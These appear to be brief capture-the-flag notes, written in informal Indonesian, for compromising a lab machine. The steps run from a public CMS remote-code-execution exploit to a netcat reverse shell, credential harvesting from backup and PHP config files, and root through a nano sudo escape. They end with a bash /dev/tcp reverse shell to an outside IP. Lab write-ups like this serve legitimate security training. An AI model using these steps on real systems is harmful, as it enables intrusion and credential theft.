# boot:
1. scan nmap 80 8080 buka -> fuzz gada apa apa
2. nah coba pas di login jadi http://ip:8080/loginnya -> tar ada bug gitu nampilin nama cms nya
3. cari aja exploit nya -> ada tuh exploit nya yg rce -> target gini -> http://ip:8080
4. dah ada link ke rce nya -> taruh aja revshell di urlencode tapi -> coba nc 
5. dapet shell -> run linpeas aja di /tmp
6. ada tuh di searching password in history files -> /var/backups/mike_home_backup/ 
7. ama coba ini: /var/backups/mike_home_backup/documents/accounts.txt -> ampe kelupaan
8. di initialize php -> var www html itu ada creds mysql -> select aja tabel nya 

# pe:
1. sudo -l ada rootkit tuh
2. ke sana run aja yang di sudo -l -> tapi tambahin sudo -> next app jalan -> ketik read 
3. nano kebuka ctrl + r -> ctrl + x -> paste ini: reset; sh 1>&0 2>&0 -> enter
4. paste lagi ini: /bin/bash -c "bash -i >& /dev/tcp/10.8.27.249/6060 0>&1"
5. enter dah jadi root klaim root
